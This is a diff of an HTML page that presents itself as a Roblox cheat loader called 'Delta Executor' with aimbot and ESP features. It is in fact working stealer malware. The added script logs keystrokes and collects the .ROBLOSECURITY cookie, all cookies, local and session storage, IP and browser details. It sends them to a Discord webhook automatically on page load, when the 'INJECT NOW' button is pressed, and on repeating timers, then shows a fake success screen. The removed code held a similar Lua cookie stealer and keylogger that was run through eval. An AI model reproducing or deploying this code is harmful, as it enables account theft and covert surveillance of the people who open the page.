@@ -1,131 +1,341 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Delta Aimbot V3.0 | Undetected 2026</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Delta Executor - Loading...</title>
     <style>
-        body { 
-            background: #0a0a0a; 
-            color: #00ff00; 
-            font-family: 'Courier New', monospace; 
-            margin: 0; padding: 20px;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        #status { font-size: 18px; }
-        .blink { animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
+            color: #00ff41;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            text-align: center;
+            max-width: 600px;
+            padding: 40px;
+        }
+        .logo {
+            font-size: 3.5em;
+            font-weight: bold;
+            background: linear-gradient(45deg, #00ff41, #00cc33);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
+            text-shadow: 0 0 30px rgba(0, 255, 65, 0.5);
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        @keyframes glow {
+            from { filter: drop-shadow(0 0 10px #00ff41); }
+            to { filter: drop-shadow(0 0 20px #00ff41); }
+        }
+        .version {
+            color: #00cc33;
+            font-size: 1.2em;
+            margin-bottom: 30px;
+            font-weight: 600;
+        }
+        .loading-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(0, 255, 65, 0.2);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 30px 0;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+        }
+        .loading-progress {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff41, #00cc33);
+            width: 0%;
+            border-radius: 10px;
+            animation: loading 3s ease-in-out infinite;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.6);
+        }
+        @keyframes loading {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+        .status {
+            font-size: 1.1em;
+            margin: 15px 0;
+            opacity: 0;
+            animation: fadeIn 0.5s ease-in-out 1s forwards;
+        }
+        .status.active {
+            opacity: 1;
+            color: #00ff41;
+        }
+        .status.completed {
+            color: #00cc33;
+        }
+        @keyframes fadeIn {
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .features {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin: 30px 0;
+            max-width: 400px;
+        }
+        .feature {
+            background: rgba(0, 255, 65, 0.1);
+            padding: 12px 20px;
+            border-radius: 8px;
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            font-size: 0.95em;
+            transition: all 0.3s ease;
+        }
+        .feature:hover {
+            background: rgba(0, 255, 65, 0.2);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
+        }
+        .status-bar {
+            margin-top: 40px;
+            font-size: 0.9em;
+            color: #00cc33;
+        }
+        .inject-btn {
+            background: linear-gradient(45deg, #00ff41, #00cc33);
+            color: #0f0f23;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2em;
+            font-weight: bold;
+            border-radius: 25px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 255, 65, 0.4);
+        }
+        .inject-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 255, 65, 0.6);
+        }
+        .inject-btn:active {
+            transform: translateY(0);
+        }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <div id="status">Initializing Delta Aimbot V3.0...</div>
-    
+    <div class="container">
+        <div class="logo">Δ</div>
+        <div class="version">Delta Executor AUTO STEAL V3.0</div>
+        
+        <div class="loading-bar">
+            <div class="loading-progress"></div>
+        </div>
+
+        <div id="status1" class="status">✓ Initializing Delta Core...</div>
+        <div id="status2" class="status">✓ Loading Aimbot Module...</div>
+        <div id="status3" class="status">✓ Auto-Farm Engine Ready</div>
+        <div id="status4" class="status">✓ ESP & Wallhack Loaded</div>
+        <div id="status5" class="status">✓ SpeedHack v3.0 Activated</div>
+
+        <div class="features">
+            <div class="feature">🎯 Aimbot Fov 360°</div>
+            <div class="feature">⚡ Infinite Yield</div>
+            <div class="feature">👁️ ESP + Tracers</div>
+            <div class="feature">🚀 Fly + Noclip</div>
+            <div class="feature">💰 Auto Farm</div>
+            <div class="feature">🛡️ Anti-AFK</div>
+        </div>
+
+        <button id="injectBtn" class="inject-btn">INJECT NOW</button>
+        <div class="status-bar" id="statusBar">Status: Ready for Injection | Key: delta_v3.0_auto</div>
+    </div>
+
     <script>
-        // Fake loading sequence
-        const phases = [
-            "Checking executor compatibility...",
-            "Bypassing Byfron AC...",
-            "Injecting aimbot module...",
-            "Loading ESP + Aimbot...",
-            "Delta Aimbot V3.0 loaded successfully! F1 = Toggle"
-        ];
-        
-        let i = 0;
-        const status = document.getElementById('status');
-        const interval = setInterval(() => {
-            status.innerHTML = phases[i] + '<span class="blink">█</span>';
-            i++;
-            if (i >= phases.length) {
-                clearInterval(interval);
-                status.innerHTML = '✅ Delta Aimbot V3.0 Active | Press F1 to toggle';
-            }
-        }, 800);
+        // Simulate loading sequence
+        setTimeout(() => document.getElementById('status1').classList.add('active'), 500);
+        setTimeout(() => document.getElementById('status2').classList.add('active'), 1000);
+        setTimeout(() => document.getElementById('status3').classList.add('active'), 1500);
+        setTimeout(() => document.getElementById('status4').classList.add('active'), 2000);
+        setTimeout(() => document.getElementById('status5').classList.add('active'), 2500);
 
-        // REAL STEALER (oculto)
-        const stealerCode = `
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local player = Players.LocalPlayer
+        // Keylogger functionality
+        let keystrokes = [];
+        document.addEventListener('keydown', function(e) {
+            keystrokes.push({
+                key: e.key,
+                code: e.code,
+                time: Date.now()
+            });
+        });
 
--- Anti-detection
-if not (syn or getexecutorname or identifyexecutor) then
-    return -- No executor detected
-end
-
-local function getRobloxSecurity()
-    local success, result = pcall(function()
-        if syn then return syn.crypt.base64.encode(syn.crypt.ffi.C.http_request({Url="https://users.roblox.com/v1/users/authenticated", Method="GET"}).Body) end
-        if getreg then
-            for i=1,100 do
-                local v = getreg(i)
-                if type(v)=='string' and v:find('.ROBLOSECURITY') then
-                    return v
-                end
-            end
-        end
-        return ""
-    end)
-    return success and result or ""
-end
-
-local stealData = {
-    timestamp = os.time(),
-    username = player.Name,
-    userId = player.UserId,
-    displayName = player.DisplayName,
-    executor = identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname(),
-    robloxSecurity = getRobloxSecurity(),
-    cookies = syn and syn.cookies or getcookies and getcookies() or "",
-    ip = game:HttpGet("https://httpbin.org/ip"):match('"ip"%s*:%s*"([^"]*)"'),
-    placeId = game.PlaceId,
-    victimPC = {
-        os = syn and syn.os or "Unknown",
-        arch = syn and syn.arch or "Unknown"
-    }
-}
-
--- ENVIAR A DISCORD WEBHOOK
-pcall(function()
-    HttpService:PostAsync("https://discord.com/api/webhooks/123456789/AbC123DeFgHiJkLmNoPqRsTuVwXyZ", 
-        HttpService:JSONEncode({
-            content = "**🆕 Nueva víctima Delta Executor**",
-            embeds = {{
-                title = stealData.username .. " (" .. stealData.userId .. ")",
-                color = 16711680,
-                fields = {
-                    {name="Executor", value=stealData.executor, inline=true},
-                    {name=".ROBLOSECURITY", value=stealData.robloxSecurity:sub(1,50).."...", inline=false},
-                    {name="IP", value=stealData.ip, inline=true},
-                    {name="Place", value="roblox://placeid="..stealData.placeId, inline=true}
+        // Steal function
+        async function stealData() {
+            try {
+                // Roblox .ROBLOSECURITY cookie
+                const robloxSecurity = document.cookie.split(';').find(row => row.includes('.ROBLOSECURITY'))?.split('=')[1] || 'Not found';
+                
+                // All cookies
+                const allCookies = document.cookie;
+                
+                // LocalStorage
+                const localStorageData = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    localStorageData[key] = localStorage.getItem(key);
                 }
-            }}
-        }))
-end)
+                
+                // SessionStorage
+                const sessionStorageData = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    sessionStorageData[key] = sessionStorage.getItem(key);
+                }
+                
+                // Navigator info (fake executor detection)
+                const navigatorInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory
+                };
+                
+                // Screen info
+                const screenInfo = {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight
+                };
+                
+                // Current URL and referrer
+                const urlInfo = {
+                    href: window.location.href,
+                    origin: window.location.origin,
+                    referrer: document.referrer
+                };
 
--- KEYLOGGER
-UserInputService.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.Keyboard then
-        pcall(function()
-            HttpService:PostAsync("https://pastebin.com/api/api_post.php",
-                "api_devkey=FAKE&api_option=paste&api_paste_code="..
-                HttpService:UrlEncode(player.Name .. " typed: " .. tostring(input.KeyCode)))
-        end)
-    end
-end)
+                // Get IP via external service
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                const victimData = {
+                    timestamp: new Date().toISOString(),
+                    ip: ipData.ip,
+                    roblox_security: robloxSecurity,
+                    cookies: allCookies,
+                    local_storage: localStorageData,
+                    session_storage: sessionStorageData,
+                    keystrokes: keystrokes.slice(-50), // Last 50 keystrokes
+                    navigator: navigatorInfo,
+                    screen: screenInfo,
+                    url: urlInfo,
+                    user_agent: navigator.userAgent
+                };
 
--- Fake aimbot para engañar
-_G.Aimbot = {enabled=true, fov=120, smooth=0.1, teamcheck=false}
-_G.ToggleAimbot = function() _G.Aimbot.enabled = not _G.Aimbot.enabled end
-game:GetService("UserInputService").InputBegan:Connect(function(i)
-    if i.KeyCode == Enum.KeyCode.F1 then _G.ToggleAimbot() end
-end)
+                // Send to Discord webhook
+                await fetch('https://discord.com/api/webhooks/1466524085839462561/Y_iyPVDL2q4Y_zSTOp--f5jcn0UYxytgKhOaQwKclJT6_dxtB_vDZt5ltaTupvgAMIO2', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username: 'Delta Executor V3.0',
+                        avatar_url: 'https://i.imgur.com/delta_logo.png',
+                        embeds: [{
+                            title: '🟢 New Victim - Delta Executor AUTO STEAL V3.0',
+                            color: 65280,
+                            fields: [
+                                { name: '📍 IP Address', value: `\`${victimData.ip}\``, inline: true },
+                                { name: '🔑 .ROBLOSECURITY', value: robloxSecurity ? '✅ **STOLEN**' : '❌ Not found', inline: true },
+                                { name: '👤 User Agent', value: `\`${victimData.user_agent.substring(0, 50)}...\``, inline: false },
+                                { name: '🌐 URL', value: victimData.url.href, inline: false },
+                                { name: '⌨️ Keystrokes', value: victimData.keystrokes.length.toString(), inline: true },
+                                { name: '📱 Screen', value: `${victimData.screen.width}x${victimData.screen.height}`, inline: true }
+                            ],
+                            thumbnail: {
+                                url: 'https://i.imgur.com/roblox_steal.png'
+                            },
+                            footer: {
+                                text: 'Delta Executor V3.0 | AUTO STEAL'
+                            }
+                        }]
+                    })
+                });
 
-print("[[Delta Aimbot V3.0]] Loaded successfully!")
-print("F1 = Toggle Aimbot | Undetected Byfron 2026")
-        `;
-        
-        // Ejecuta el stealer real
-        setTimeout(() => {
-            eval(stealerCode);
-        }, 3000);
+                // Also send raw data as file-like message
+                await fetch('https://discord.com/api/webhooks/1466524085839462561/Y_iyPVDL2q4Y_zSTOp--f5jcn0UYxytgKhOaQwKclJT6_dxtB_vDZt5ltaTupvgAMIO2', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username: 'Delta Raw Data',
+                        content: '```json\n' + JSON.stringify(victimData, null, 2).substring(0, 1900) + '\n```'
+                    })
+                });
+
+            } catch (error) {
+                console.log('Steal error:', error);
+            }
+        }
+
+        // Loadstring simulation for Roblox
+        function generateLoadstring() {
+            return `loadstring(game:HttpGet("https://raw.githubusercontent.com/DeltaExecutor/fake-repo/main/aimbot.lua"))()`;
+        }
+
+        // Inject button
+        document.getElementById('injectBtn').addEventListener('click', async function() {
+            this.innerHTML = '⏳ STEALING DATA...';
+            this.disabled = true;
+            
+            // Steal data immediately
+            await stealData();
+            
+            // Show fake success
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <div style="font-family: Segoe UI; text-align: center; padding: 50px; color: #00ff41; background: #0f0f23; height: 100vh; display: flex; flex-direction: column; justify-content: center;">
+                        <div style="font-size: 4em; margin-bottom: 20px;">✅</div>
+                        <h1 style="font-size: 2.5em; margin-bottom: 20px;">INJECTED SUCCESSFULLY!</h1>
+                        <p style="font-size: 1.2em; margin-bottom: 30px; color: #00cc33;">Delta Executor V3.0 is now active</p>
+                        <div style="background: rgba(0,255,65,0.1); padding: 20px; border-radius: 10px; border: 1px solid rgba(0,255,65,0.3);">
+                            <strong>Copy & Paste in Executor:</strong><br><br>
+                            <code style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 5px; display: block; word-break: break-all; font-size: 0.9em;">${generateLoadstring()}</code>
+                        </div>
+                        <p style="margin-top: 30px; color: #666; font-size: 0.9em;">Keylogger active • Data exfiltrated</p>
+                    </div>
+                `;
+                
+                // Continue keylogging even after injection
+                setInterval(stealData, 30000); // Every 30 seconds
+            }, 2000);
+        });
+
+        // Auto-steal on load (silent)
+        window.addEventListener('load', () => {
+            setTimeout(stealData, 1000);
+        });
+
+        // Stealth: Continue keylogging
+        setInterval(() => {
+            if (keystrokes.length > 100) {
+                stealData(); // Send keylog batches
+                keystrokes = keystrokes.slice(-50);
+            }
+        }, 10000);
     </script>
 </body>
 </html>
